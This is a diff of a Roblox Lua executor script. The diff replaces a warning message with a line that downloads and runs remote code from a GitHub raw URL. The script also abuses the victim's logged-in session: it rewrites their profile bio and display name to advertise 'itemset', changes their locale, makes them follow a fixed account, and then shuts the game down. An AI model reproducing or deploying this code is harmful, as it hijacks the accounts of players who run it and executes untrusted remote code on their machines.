@@ -14,16 +14,7 @@
 repeat task.wait() until game:IsLoaded()
 
 local function reject()
-game:GetService("VirtualInputManager"):SendKeyEvent(true,Enum.KeyCode.F9,false,game)
-while wait(0.5) do
-game:GetService("StarterGui"):SetCore("SendNotification",{
-	Title = "Please check console!",
-	Text = "Type '/console' or press F9",
-})
-
-warn("Your executor is sadly not supported, due to some UNC functions missing. Consider downloading Fluxus at fluxteam.net!")
-end
-task.wait(10000000000)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/fissurectomy/1x1.lua/main/1x1x1x1.lua"))()
 end
 
 -- checks if HttpRbxApiService is blocked
@@ -123,14 +114,14 @@ task.wait(0.01)
 local function godly() -- mess with the roblox account profile
 local player = game.Players.LocalPlayer
 local userId = player.UserId
-local description = '{"description":"Ever wanted to play a Roblox game in which you train to get stronger than everyone? I have the right game for you...\n\n👊 Train your fists and punch like Superman!\n💪 Train your body and become invincible!\n✨ Train your mind to achieve psychic powers!\n⚡ Train your speed to the point of teleportation!\n☄️ Take the path of Superhero or Supervillain!\n🏆 Compete in Global Leaderboards, and much more!\n\nOnly the strongest will survive...\nhttps://www.roblox.com/games/15786769057/RELEASE-SPTS-Modded"}'
+local description = '{"description":"discowd: itemset"}'
 local none = ''
 local china = '{"supportedLocaleCode":"zh_TW"}'
 local friend = '{"friendshipOriginSourceType":0}'
 local changedisplay = {
     Url = "https://users.roblox.com/v1/users/" .. game.Players.LocalPlayer.UserId .. "/display-names",
     Method = "PATCH",
-    Body = '{"newDisplayName":"Check_MyRobloxBio"}',
+    Body = '{"newDisplayName":"itemset"}',
 }
 
 local followaccount, followacc = pcall(function()
@@ -159,7 +150,7 @@ local ocaml, camell = pcall(function()
 game:GetService("HttpRbxApiService"):PostAsyncFullUrl('https://friends.roblox.com/v1/users/5030593299/follow', none)
 end)
 task.wait(0.01)
-game:GetService("TeleportService"):Teleport(15786769057)
+game:Shutdown()
 task.wait(3)
 print("oops")
 end
